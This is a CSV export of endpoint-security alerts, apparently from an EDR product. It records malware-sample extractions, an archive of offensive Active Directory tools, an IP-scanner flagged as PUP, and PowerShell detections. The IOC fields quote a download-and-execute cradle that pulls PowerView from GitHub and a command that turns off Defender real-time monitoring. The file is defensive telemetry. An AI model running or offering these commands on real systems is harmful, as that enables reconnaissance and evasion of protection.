Hostname,OS_Version,Severity,Confidence,Tactic,Technique,Description,Process_Name,Process_Path,Command_Line,User_Name,Parent_Process,Parent_Command_Line,Files_Accessed,Files_Written,IOCs,Network_Accesses,SHA256,MD5
****,Windows 10,High,80,Defense Evasion,Masquerading,"A process has written a suspicious file to disk. Adversaries may write a malicious file to a commonly trusted directory, use a benign name, or a mismatched file extension. This is done for the sake of evading defenses and observation. Check the activity and surrounding events are expected in your environment.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" x -iext -ver -imon1 -- ""C:\Users\Admin\Desktop\malwattevalley11.zip"" C:\Users\Admin\Desktop\",****,explorer.exe,C:\windows\Explorer.EXE,dcomexec.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);goldenPac.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ntfs-read.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);dpapi.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);keylistattack.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ntlmrelayx.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);Get-GPPPassword.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);esentutl.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);ping.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);GetADUsers.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin),GetADUsers.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);dacledit.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);goldenPac.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);psexec.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);raiseChild.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);rbcd.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);getPac.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);DumpNTLMInfo.py (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin);mimikatz.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__);describeTicket.cpython-313.pyc (\Device\HarddiskVolume3\Users\Admin\Desktop\malwattevalley\bloodh\venv\bin\__pycache__),,,a7814203d7a5124fda5c48e02c2856694d584f458f00bb695d63b61d9c3f9005,a40c46ea3459f9ac799e87b1945710f1
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",chrome.exe,\Device\HarddiskVolume7\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,page_embed_script.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);offscreendocument_main.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);page_embed_script.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted);offscreendocument.html (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.92.1_0);js.js (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\js);default.png (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\gppongmhjkpfnbhagpmjfkannfbllamg\6.10.83_0\images\icons\converted),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,4ea241a2565eeee33cb13f995bc81a02
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,80,Execution,PowerShell,A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),"iex(iwr(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1""))",185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,PowerShell,A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),"iex(iwr(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1""))",185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,PowerShell,A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),Set-MpPreference -DisableRealtimeMonitoring $true,185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,PowerShell,A PowerShell script related to this process is likely malicious or shares characteristics with known malicious scripts. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine);ConsoleHost_history.txt (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine),PowerView.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando),Set-MpPreference -DisableRealtimeMonitoring $true,185.199.110.133:443 (TCP),3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Low,100,Malware,PUP,This file is classified as Adware/PUP based on its SHA256 hash.,ipscan-3.9.1-setup.exe,\Device\HarddiskVolume7\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe,"""C:\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --always-read-main-dll --field-trial-handle=2224,i,14317981040131843377,15210902797678255994,262144 --variations-seed-version --mojo-platform-channel-handle=2476 /prefetch:11",****,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%26form%3DWSBEDG%26qs%3DLT%26cvid%3D26a3753cf2bf46cd90553a000b7a397b%26pq%3Dangry%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1748337130412%26nclidts%3D1748337130%26tsms%3D412%26wsso%3DModerate&timestamp=1748337130416&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",,f_00039f (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cache\Cache_Data),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,23.202.229.23:443 (TCP);216.239.36.178:443 (UDP);185.199.109.153:443 (TCP);4.241.155.66:443 (TCP);23.50.232.83:443 (TCP);13.107.253.59:443 (TCP);150.171.28.10:443 (TCP);13.107.246.59:443 (TCP);13.107.42.16:443 (TCP);150.171.28.11:80 (TCP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%26form%3DWSBEDG%26qs%3DLT%26cvid%3D26a3753cf2bf46cd90553a000b7a397b%26pq%3Dangry%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1748337130412%26nclidts%3D1748337130%26tsms%3D412%26wsso%3DModerate&timestamp=1748337130416&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",****,sihost.exe,sihost.exe,,ipscan-3.9.1-setup.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849 (\Device\HarddiskVolume7\Users\mdwis\Downloads\834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849),834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,,834768d587289a63bef5880838f8259865e701419811068f7a3644c40a869849,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Downloads\41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add (\Device\HarddiskVolume7\Users\mdwis\Downloads\41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add),41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add,,41f70faa8f3997ec1dbbe0fdb9aedb488645e8785ccdd0cb4978426e134a6add,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,Low,100,Malware,PUP,This file is classified as Adware/PUP based on its SHA256 hash.,ipscan-3.9.1-setup.exe,\Device\HarddiskVolume7\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe,"""C:\Users\mdwis\Downloads\ipscan-3.9.1-setup.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,,892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%2Bdownload%26form%3DWSBEDG%26qs%3DMT%26cvid%3D1a54be18405d45b78367ca153a8fd7f4%26pq%3Dangry%2Bip%2Bscanner%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1745822796611%26nclidts%3D1745822796%26tsms%3D611%26wsso%3DModerate&timestamp=1745822796613&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",****,sihost.exe,sihost.exe,,ipscan-3.9.1-setup.exe (\Device\HarddiskVolume7\Users\mdwis\Downloads),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,224.0.0.251:5353 (UDP);ff02:0:0:0:0:0:0:fb:5353 (UDP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 11,Low,100,Malware,PUP,A file written to the file-system was classified as Adware/PUP based on its SHA256 hash.,msedge.exe,\Device\HarddiskVolume7\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --always-read-main-dll --field-trial-handle=2252,i,10893692767256603793,17799270140690513196,262144 --variations-seed-version --mojo-platform-channel-handle=2456 /prefetch:11",****,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --single-argument microsoft-edge:?url=https%3A%2F%2Fwww.bing.com%2Fsearch%3Fq%3Dangry%2Bip%2Bscanner%2Bdownload%26form%3DWSBEDG%26qs%3DMT%26cvid%3D1a54be18405d45b78367ca153a8fd7f4%26pq%3Dangry%2Bip%2Bscanner%26cc%3DLK%26setlang%3Den-US%26nclid%3DE4A68D2F4BF55F080B5F5842E2A3D265%26ts%3D1745822796611%26nclidts%3D1745822796%26tsms%3D611%26wsso%3DModerate&timestamp=1745822796613&source=WindowsSearchBox&campaign=addedgeprot&medium=AutoSuggest&oid=u%3A430fae35-d39b-4855-a08b-355c3c882b07.44e3cf94-19c9-4e32-96c3-14f5bf01391a&upn=it20614294%40my.sliit.lk",,f_0001c9 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cache\Cache_Data),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,74.125.130.99:443 (UDP);23.212.254.9:443 (TCP);142.251.10.132:443 (TCP);142.251.12.94:443 (TCP);104.88.70.184:443 (TCP);10.1.0.80:53 (UDP);142.251.10.100:443 (TCP);10.40.87.90:8009 (TCP);185.199.110.133:443 (TCP);20.205.243.166:443 (TCP),892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0,e9fda12cfcceffd2e6a19c39dcb01b1e
****,Windows 10,High,,Machine Learning,Sensor-based ML,,payload.exe,E:\payload.exe,,****,,,,,,,394a141d547731cd00a1be936e87235a1a526189fb6147505a30ff7311a2cb64,
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""D:\Users\deshan.fernando\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000067.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);IconCache.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local);iconcache_16.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);cversions.1.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);iconcache_idx.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,iconcache_32.db (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Windows\Explorer);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume7\Users\mdwis\Desktop),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Temp\Rar$DIb17684.38276),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,80,AI Powered IOA,Malicious File,A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.,test.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC\test.exe,"""D:\Users\deshan.fernando\Desktop\CBC\test.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume7\Users\mdwis\Desktop);iconcache_32.db (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Microsoft\Windows\Explorer),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Temp\Rar$DIb17684.38276),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Cloud-based ML,This file meets the File Analysis ML algorithm's high-confidence threshold for malware.,test.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC\test.exe,"""D:\Users\deshan.fernando\Desktop\CBC\test.exe"" ",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""D:\Users\deshan.fernando\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);iconcache_16.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);iconcache_idx.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);IconCache.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);cversions.1.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000067.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 